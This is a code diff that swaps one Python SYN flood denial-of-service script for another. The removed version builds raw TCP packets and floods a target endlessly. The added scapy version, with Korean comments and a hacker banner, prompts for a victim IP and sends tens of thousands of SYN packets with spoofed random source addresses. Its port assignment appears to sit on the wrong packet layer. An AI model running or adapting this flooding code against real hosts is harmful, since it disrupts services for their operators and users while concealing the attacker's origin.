@@ -1,87 +1,56 @@
-#!/usr/bin/env python2
-'''
-Code by LeeOn123
-'''
-import socket, sys, threading, random
-from struct import *
-from requests import *
-if len(sys.argv)<=2:
-    print("Usage: python "+ sys.argv[0]+ " <target ip> <port>")
-    sys.exit()
+from scapy.all import *
+import random
 
-def checksum(msg):
-    s = 0
-    for i in range(0, len(msg), 2):
-        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
-        s = s + w
-    
-    s = (s>>16) + (s & 0xffff);
-    s = ~s & 0xffff
-    
-    return s
+# 공격 대상 정보 클래스
+class vic_dev():
+    def __init__(self, ip_addr):
+        self.ip_addr = ip_addr
 
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-except socket.error , msg:
-    print ('Socket could not be created. Error Code : ' + str(msg[0]) +' Message ' + msg[1])
-    sys.exit()
- 
-s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+# 배너를 보여주는 함수
+def show_banner():
+    print("<< SYN FLOOD ATTACK >>")
+    print("[!] By Normaltic")
+    print("[!] Youtube : Normaltic Place")
+    print()
+    print("[*] Interface : {}".format(conf.iface)) 
 
-source_ip = get('https://api.ipify.org').text
-dest_ip = socket.gethostbyname(str(sys.argv[1]))
+# 공격 대상의 IP 정보를 입력받는 함수
+def set_victim_ip():
+    print()
+    print("[*] Enter Victim IP Address")
+    victim = vic_dev(input("> "))
+    return victim
 
-def header():
-  ihl = 5
-  version = 4
-  tos = 0
-  tot_len = 20 + 20
-  id = random.randint(1,65535)
-  frag_off = 0
-  ttl = random.randint(1,255)
-  protocol = socket.IPPROTO_TCP
-  check = 10 
-  saddr =socket.inet_aton ( source_ip )
-  daddr = socket.inet_aton ( dest_ip )
-  ihl_version = (version << 4) + ihl
-  global ip_header
-  ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
+# Syn Flood 공격 함수
+def run_attack(victim):
+    # 웹 포트 80, 열려있는 다른 TCP 포트로 설정해도 됨. 
+    port = 80
 
-def tcp():
-  header()
-  source = random.randint(36000, 65535)
-  dest = int(sys.argv[2])
-  seq = 0
-  ack_seq = 0
-  doff = 5
-  fin = 0
-  syn = 1
-  rst = 0
-  psh = 0
-  ack = 0
-  urg = 0
-  window = socket.htons (5840)
-  check = 0
-  urg_ptr = 0
-  offset_res = (doff << 4) + 0
-  tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) +(ack << 4) + (urg << 5)
-  tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
-  source_address = socket.inet_aton( source_ip )
-  dest_address = socket.inet_aton(dest_ip)
-  placeholder = 0
-  protocol = socket.IPPROTO_TCP
-  tcp_length = len(tcp_header)
-  psh = pack('!4s4sBBH', source_address , dest_address , placeholder , protocol , tcp_length);
-  psh = psh + tcp_header;
-  tcp_checksum = checksum(psh)
-  tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
-  global packet
-  packet = ip_header + tcp_header
+    # 횟수를 99999 반복. 이 부분을 while 문으로 돌려서 공격해도 됨.
+    for x in range(0, 99999):
+        packetIP = IP()
+        # IP 스푸핑, 공격자 IP 주소를 랜덤하게 설정
+        packetIP.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
+        packetIP.dst = victim.ip_addr
+        packetTCP = TCP()
+        packetIP.sport = RandShort()
+        packetIP.dport = port
+        # TCP 패킷을 SYN 패킷으로 설정
+        packetTCP.flags = 'S'
 
-def run():
-  while True:
-    tcp()
-    s.sendto(packet, (dest_ip , 0))
-    print '.',
+       # 더미 데이터 (없어도 됨.)
+        raw = Raw(b"N"*1024)
+        packet = packetIP/packetTCP/raw
 
-run()
+        send(packet, verbose=0)
+        print("send packet {}".format(str(x)))
+
+# 메인 함수
+def main():
+    show_banner()
+    victim = set_victim_ip()
+    print("Attack {} ...".format(victim.ip_addr))
+    run_attack(victim)
+
+if __name__ =='__main__':
+    main()
